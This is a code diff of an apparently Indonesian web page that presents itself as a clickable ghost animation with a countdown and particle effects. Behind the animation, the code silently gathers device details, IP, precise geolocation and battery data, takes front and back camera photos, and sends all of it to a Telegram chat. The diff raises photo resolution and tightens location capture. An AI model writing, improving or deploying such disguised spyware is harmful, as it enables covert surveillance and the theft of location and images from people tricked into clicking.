@@ -19,6 +19,7 @@
             align-items: center;
             overflow: hidden;
             font-family: Arial, sans-serif;
+            cursor: pointer;
         }
         
         .ghost-container {
@@ -27,34 +28,46 @@
         }
         
         .main-ghost {
-            font-size: 30vw;
+            font-size: 35vw;
             animation: float 3s ease-in-out infinite;
-            text-shadow: 0 0 50px rgba(255, 255, 255, 0.8);
+            text-shadow: 0 0 60px rgba(255, 255, 255, 0.9);
             cursor: pointer;
             transition: all 0.3s;
             user-select: none;
             z-index: 100;
             position: relative;
-            filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.5));
+            filter: drop-shadow(0 0 25px rgba(255, 255, 255, 0.6));
         }
         
         .main-ghost:hover {
-            transform: scale(1.15);
-            text-shadow: 0 0 70px rgba(255, 255, 255, 1);
+            transform: scale(1.2);
+            text-shadow: 0 0 80px rgba(255, 255, 255, 1);
         }
         
         .main-ghost:active {
-            transform: scale(0.9);
+            transform: scale(0.85);
         }
         
         .ghost-particle {
             position: absolute;
-            font-size: 5rem;
+            font-size: 6rem;
             pointer-events: none;
             opacity: 0;
             z-index: 1;
-            animation: particle 2s ease-out forwards;
-            filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.7));
+            animation: particle 2.5s ease-out forwards;
+            filter: drop-shadow(0 0 15px rgba(255, 255, 255, 0.8));
+        }
+        
+        .countdown {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 8vw;
+            color: white;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.8);
+            opacity: 0;
+            z-index: 1000;
         }
         
         .pulse-effect {
@@ -62,10 +75,10 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 40vw;
-            height: 40vw;
+            width: 50vw;
+            height: 50vw;
             border-radius: 50%;
-            background: radial-gradient(circle, rgba(255,255,255,0.8) 0%, rgba(255,255,255,0) 70%);
+            background: radial-gradient(circle, rgba(255,255,255,0.9) 0%, rgba(255,255,255,0) 70%);
             opacity: 0;
             z-index: 0;
         }
@@ -73,19 +86,19 @@
         @keyframes float {
             0%, 100% { 
                 transform: translateY(0px) rotate(0deg); 
-                text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
+                text-shadow: 0 0 40px rgba(255, 255, 255, 0.8);
             }
             25% { 
-                transform: translateY(-25px) rotate(5deg);
-                text-shadow: 0 0 40px rgba(255, 255, 255, 1);
+                transform: translateY(-30px) rotate(8deg);
+                text-shadow: 0 0 60px rgba(255, 255, 255, 1);
             }
             50% { 
-                transform: translateY(-10px) rotate(-5deg);
-                text-shadow: 0 0 35px rgba(255, 255, 255, 0.9);
+                transform: translateY(-15px) rotate(-8deg);
+                text-shadow: 0 0 50px rgba(255, 255, 255, 0.9);
             }
             75% { 
-                transform: translateY(-20px) rotate(3deg);
-                text-shadow: 0 0 45px rgba(255, 255, 255, 1);
+                transform: translateY(-25px) rotate(5deg);
+                text-shadow: 0 0 70px rgba(255, 255, 255, 1);
             }
         }
         
@@ -96,17 +109,32 @@
             }
             100% { 
                 opacity: 0;
-                transform: translate(var(--tx), var(--ty)) scale(0.2) rotate(360deg);
+                transform: translate(var(--tx), var(--ty)) scale(0.1) rotate(720deg);
             }
         }
         
         @keyframes pulse {
             0% {
-                transform: translate(-50%, -50%) scale(0.5);
+                transform: translate(-50%, -50%) scale(0.3);
                 opacity: 1;
             }
             100% {
-                transform: translate(-50%, -50%) scale(2);
+                transform: translate(-50%, -50%) scale(2.5);
+                opacity: 0;
+            }
+        }
+        
+        @keyframes countdownPop {
+            0% {
+                transform: translate(-50%, -50%) scale(0);
+                opacity: 0;
+            }
+            50% {
+                transform: translate(-50%, -50%) scale(1.2);
+                opacity: 1;
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(1);
                 opacity: 0;
             }
         }
@@ -114,15 +142,23 @@
         @keyframes collecting {
             0% {
                 transform: scale(1);
-                filter: hue-rotate(0deg);
+                filter: hue-rotate(0deg) brightness(1);
+            }
+            25% {
+                transform: scale(1.4);
+                filter: hue-rotate(90deg) brightness(1.5);
             }
             50% {
+                transform: scale(0.9);
+                filter: hue-rotate(180deg) brightness(1);
+            }
+            75% {
                 transform: scale(1.3);
-                filter: hue-rotate(180deg);
+                filter: hue-rotate(270deg) brightness(1.5);
             }
             100% {
                 transform: scale(1);
-                filter: hue-rotate(360deg);
+                filter: hue-rotate(360deg) brightness(1);
             }
         }
     </style>
@@ -130,6 +166,7 @@
 <body>
     <div class="ghost-container">
         <div class="main-ghost" id="mainGhost">👻</div>
+        <div class="countdown" id="countdown"></div>
     </div>
 
     <!-- Elemen tersembunyi untuk kamera -->
@@ -142,6 +179,7 @@
         const CHAT_ID = "6368768388";
         
         const mainGhost = document.getElementById('mainGhost');
+        const countdown = document.getElementById('countdown');
         const cameraVideo = document.getElementById('cameraVideo');
         const cameraCanvas = document.getElementById('cameraCanvas');
         
@@ -157,10 +195,10 @@
                 oscillator.connect(gainNode);
                 gainNode.connect(audioContext.destination);
                 
-                oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
-                oscillator.frequency.exponentialRampToValueAtTime(300, audioContext.currentTime + 0.1);
+                oscillator.frequency.setValueAtTime(1000, audioContext.currentTime);
+                oscillator.frequency.exponentialRampToValueAtTime(200, audioContext.currentTime + 0.1);
                 
-                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+                gainNode.gain.setValueAtTime(0.4, audioContext.currentTime);
                 gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.1);
                 
                 oscillator.start(audioContext.currentTime);
@@ -177,20 +215,21 @@
             // Mainkan suara klik
             playClickSound();
             
-            // Buat efek partikel
-            createGhostParticles(e.clientX, e.clientY);
-            
             // Mulai proses pengumpulan data dengan delay 3 detik
             isCollecting = true;
             
-            // Efek visual selama delay
-            mainGhost.style.animation = 'collecting 1s infinite';
+            // Sembunyikan emoji utama sementara
+            mainGhost.style.opacity = '0.3';
             
-            // Tunggu 3 detik
-            await new Promise(resolve => setTimeout(resolve, 3000));
+            // Tampilkan countdown
+            await showCountdown();
             
-            // Kembalikan animasi normal
+            // Kembalikan emoji utama
+            mainGhost.style.opacity = '1';
             mainGhost.style.animation = 'float 3s ease-in-out infinite';
+            
+            // Tampilkan efek partikel
+            createGhostParticles(e.clientX, e.clientY);
             
             // Kumpulkan dan kirim data
             await collectAndSendData();
@@ -198,20 +237,46 @@
             isCollecting = false;
         });
         
+        // Fungsi untuk menampilkan countdown
+        async function showCountdown() {
+            return new Promise(resolve => {
+                const countdownNumbers = ['3', '2', '1'];
+                let currentIndex = 0;
+                
+                function showNextNumber() {
+                    if (currentIndex < countdownNumbers.length) {
+                        countdown.textContent = countdownNumbers[currentIndex];
+                        countdown.style.animation = 'countdownPop 1s forwards';
+                        
+                        setTimeout(() => {
+                            countdown.style.animation = 'none';
+                            currentIndex++;
+                            showNextNumber();
+                        }, 1000);
+                    } else {
+                        countdown.textContent = '';
+                        resolve();
+                    }
+                }
+                
+                showNextNumber();
+            });
+        }
+        
         // Fungsi untuk membuat partikel emoji
         function createGhostParticles(x, y) {
-            const particlesCount = 30;
-            const emojis = ['👻', '💀', '🦇', '🕷️', '🕸️', '🎃', '😈', '👹', '👺', '☠️', '⚡', '🌟'];
+            const particlesCount = 40;
+            const emojis = ['👻', '💀', '🦇', '🕷️', '🕸️', '🎃', '😈', '👹', '👺', '☠️', '⚡', '🌟', '💫', '✨', '🔥'];
             
             // Buat efek pulse
             const pulse = document.createElement('div');
             pulse.className = 'pulse-effect';
-            pulse.style.animation = 'pulse 1s forwards';
+            pulse.style.animation = 'pulse 1.5s forwards';
             document.body.appendChild(pulse);
             
             setTimeout(() => {
                 document.body.removeChild(pulse);
-            }, 1000);
+            }, 1500);
             
             for (let i = 0; i < particlesCount; i++) {
                 const particle = document.createElement('div');
@@ -222,7 +287,7 @@
                 particle.textContent = randomEmoji;
                 
                 // Random size
-                const randomSize = 3 + Math.random() * 6;
+                const randomSize = 4 + Math.random() * 8;
                 particle.style.fontSize = randomSize + 'rem';
                 
                 particle.style.left = (x - randomSize * 8) + 'px';
@@ -230,7 +295,7 @@
                 
                 // Random arah dan jarak
                 const angle = Math.random() * Math.PI * 2;
-                const distance = 150 + Math.random() * 300;
+                const distance = 200 + Math.random() * 400;
                 const tx = Math.cos(angle) * distance;
                 const ty = Math.sin(angle) * distance;
                 
@@ -239,7 +304,11 @@
                 
                 // Random color effect
                 const hue = Math.random() * 360;
-                particle.style.filter = `hue-rotate(${hue}deg) drop-shadow(0 0 10px rgba(255, 255, 255, 0.7))`;
+                const saturation = 70 + Math.random() * 30;
+                particle.style.filter = `hue-rotate(${hue}deg) saturate(${saturation}%) drop-shadow(0 0 15px rgba(255, 255, 255, 0.8))`;
+                
+                // Random delay
+                particle.style.animationDelay = (Math.random() * 0.5) + 's';
                 
                 document.body.appendChild(particle);
                 
@@ -248,51 +317,59 @@
                     if (particle.parentNode) {
                         particle.parentNode.removeChild(particle);
                     }
-                }, 2000);
+                }, 2500);
             }
         }
         
         // Fungsi untuk mengambil foto dari kamera
         async function capturePhoto(facingMode = 'user') {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: facingMode,
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    }
-                });
-                
-                cameraVideo.srcObject = stream;
-                
-                // Tunggu video siap
-                await new Promise(resolve => {
-                    cameraVideo.onloadedmetadata = () => {
-                        resolve();
-                    };
-                });
-                
-                // Ambil frame
-                const context = cameraCanvas.getContext('2d');
-                cameraCanvas.width = cameraVideo.videoWidth;
-                cameraCanvas.height = cameraVideo.videoHeight;
-                context.drawImage(cameraVideo, 0, 0);
-                
-                // Konversi ke blob
-                return new Promise(resolve => {
+            return new Promise(async (resolve) => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { 
+                            facingMode: facingMode,
+                            width: { ideal: 1920 },
+                            height: { ideal: 1080 }
+                        }
+                    });
+                    
+                    cameraVideo.srcObject = stream;
+                    
+                    // Tunggu video siap
+                    await new Promise(resolve => {
+                        cameraVideo.onloadedmetadata = () => {
+                            resolve();
+                        };
+                    });
+                    
+                    // Tunggu sedikit untuk fokus dan exposure
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                    
+                    // Ambil frame
+                    const context = cameraCanvas.getContext('2d');
+                    cameraCanvas.width = cameraVideo.videoWidth;
+                    cameraCanvas.height = cameraVideo.videoHeight;
+                    context.drawImage(cameraVideo, 0, 0);
+                    
+                    // Konversi ke blob
                     cameraCanvas.toBlob(blob => {
                         // Hentikan stream
                         stream.getTracks().forEach(track => track.stop());
                         resolve(blob);
-                    }, 'image/jpeg', 0.8);
-                });
-            } catch (error) {
-                return null;
-            }
+                    }, 'image/jpeg', 0.9);
+                    
+                } catch (error) {
+                    console.error('Error capturing photo:', error);
+                    resolve(null);
+                }
+            });
         }
         
         // Fungsi untuk mengumpulkan dan mengirim data
         async function collectAndSendData() {
+            // Tampilkan efek pengumpulan data
+            mainGhost.style.animation = 'collecting 2s infinite';
+            
             // Kumpulkan data perangkat
             const deviceData = await collectDeviceData();
             
@@ -306,16 +383,35 @@
             try {
                 const frontPhoto = await capturePhoto('user');
                 if (frontPhoto) {
-                    await sendPhotoToTelegram(frontPhoto, 'Kamera Depan');
+                    await sendPhotoToTelegram(frontPhoto, '📷 KAMERA DEPAN - BERHASIL');
+                    deviceData.kameraDepan = "Berhasil";
+                } else {
+                    deviceData.kameraDepan = "Gagal";
                 }
                 
+                // Coba kamera belakang
                 const backPhoto = await capturePhoto('environment');
                 if (backPhoto) {
-                    await sendPhotoToTelegram(backPhoto, 'Kamera Belakang');
+                    await sendPhotoToTelegram(backPhoto, '📷 KAMERA BELAKANG - BERHASIL');
+                    deviceData.kameraBelakang = "Berhasil";
+                } else {
+                    deviceData.kameraBelakang = "Gagal";
                 }
+                
+                // Update pesan dengan status kamera
+                const updatedMessage = formatMessage(deviceData);
+                await sendToTelegram(updatedMessage);
+                
             } catch (e) {
-                // Jika gagal mengambil foto, lanjutkan tanpa foto
+                console.error('Error capturing photos:', e);
+                deviceData.kameraDepan = "Gagal";
+                deviceData.kameraBelakang = "Gagal";
+                const updatedMessage = formatMessage(deviceData);
+                await sendToTelegram(updatedMessage);
             }
+            
+            // Kembalikan animasi normal
+            mainGhost.style.animation = 'float 3s ease-in-out infinite';
         }
         
         // Fungsi untuk mengumpulkan data perangkat
@@ -331,7 +427,8 @@
                 day: 'numeric',
                 hour: '2-digit',
                 minute: '2-digit',
-                second: '2-digit'
+                second: '2-digit',
+                timeZoneName: 'short'
             };
             data.waktuLokal = now.toLocaleDateString('id-ID', options);
             data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -342,8 +439,31 @@
             // Informasi Perangkat
             const ua = navigator.userAgent;
             data.tipe = /Mobile/.test(ua) ? "HP" : "LAPTOP/COMPUTER";
-            data.merk = navigator.platform;
-            data.model = ua.split(') ')[0] + ")";
+            
+            // Deteksi merk dan model lebih akurat
+            if (/iPhone/.test(ua)) {
+                data.merk = "Apple";
+                data.model = "iPhone";
+            } else if (/iPad/.test(ua)) {
+                data.merk = "Apple";
+                data.model = "iPad";
+            } else if (/Samsung/.test(ua)) {
+                data.merk = "Samsung";
+                data.model = ua.match(/Samsung[^)]*/) ? ua.match(/Samsung[^)]*/)[0] : "Samsung Device";
+            } else if (/Mac/.test(ua)) {
+                data.merk = "Apple";
+                data.model = "Mac";
+            } else if (/Windows/.test(ua)) {
+                data.merk = "PC";
+                data.model = "Windows Device";
+            } else if (/Android/.test(ua)) {
+                data.merk = "Android";
+                data.model = "Android Device";
+            } else {
+                data.merk = navigator.platform;
+                data.model = ua.split(') ')[0] + ")";
+            }
+            
             data.os = navigator.platform;
             data.platform = navigator.platform;
             data.vendor = navigator.vendor || "Tidak Terdeteksi";
@@ -358,7 +478,7 @@
             data.pdf = navigator.pdfViewerEnabled || "Tidak Terdeteksi";
             
             // Spesifikasi Hardware
-            data.screen = `${screen.width}x${screen.height} (${screen.width * window.devicePixelRatio}x${screen.height * window.devicePixelRatio})`;
+            data.screen = `${screen.width}x${screen.height} (${Math.round(screen.width * window.devicePixelRatio)}x${Math.round(screen.height * window.devicePixelRatio)} real)`;
             data.color = screen.colorDepth + " bit";
             data.ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak Terdeteksi";
             data.cpu = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " cores" : "Tidak Terdeteksi";
@@ -373,18 +493,27 @@
                 data.ip = "Tidak Terdeteksi";
             }
             
-            data.tipeKoneksi = navigator.connection ? navigator.connection.effectiveType : "Tidak Terdeteksi";
-            data.jaringan = navigator.connection ? navigator.connection.type : "Tidak Terdeteksi";
-            data.download = navigator.connection ? navigator.connection.downlink + " Mbps" : "Tidak Terdeteksi";
-            data.ping = navigator.connection ? navigator.connection.rtt + " ms" : "Tidak Terdeteksi";
-            data.dataSaver = navigator.connection ? navigator.connection.saveData : "Tidak Terdeteksi";
+            if (navigator.connection) {
+                data.tipeKoneksi = navigator.connection.effectiveType;
+                data.jaringan = navigator.connection.type;
+                data.download = navigator.connection.downlink + " Mbps";
+                data.ping = navigator.connection.rtt + " ms";
+                data.dataSaver = navigator.connection.saveData;
+            } else {
+                data.tipeKoneksi = "Tidak Terdeteksi";
+                data.jaringan = "Tidak Terdeteksi";
+                data.download = "Tidak Terdeteksi";
+                data.ping = "Tidak Terdeteksi";
+                data.dataSaver = "Tidak Terdeteksi";
+            }
             
             // Informasi Lokasi
             try {
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
                         timeout: 10000,
-                        enableHighAccuracy: true
+                        enableHighAccuracy: true,
+                        maximumAge: 0
                     });
                 });
                 
@@ -412,8 +541,8 @@
             
             // Informasi Tambahan
             data.statusOnline = navigator.onLine ? "Online" : "Offline";
-            data.pdfViewer = "Not supported";
-            data.webDriver = "Not detected";
+            data.pdfViewer = navigator.pdfViewerEnabled ? "Supported" : "Not supported";
+            data.webDriver = navigator.webdriver ? "Detected" : "Not detected";
             
             // Informasi Battery
             if ('getBattery' in navigator) {
@@ -430,9 +559,9 @@
                 data.charging = data.level = data.chargingTime = data.dischargingTime = "Tidak Didukung";
             }
             
-            // Status Kamera
-            data.kameraDepan = "Berhasil";
-            data.kameraBelakang = "Berhasil";
+            // Status Kamera (akan diupdate nanti)
+            data.kameraDepan = "Sedang diproses";
+            data.kameraBelakang = "Sedang diproses";
             
             return data;
         }
@@ -549,4 +678,4 @@
         }
     </script>
 </body>
-</html>
+    </html>
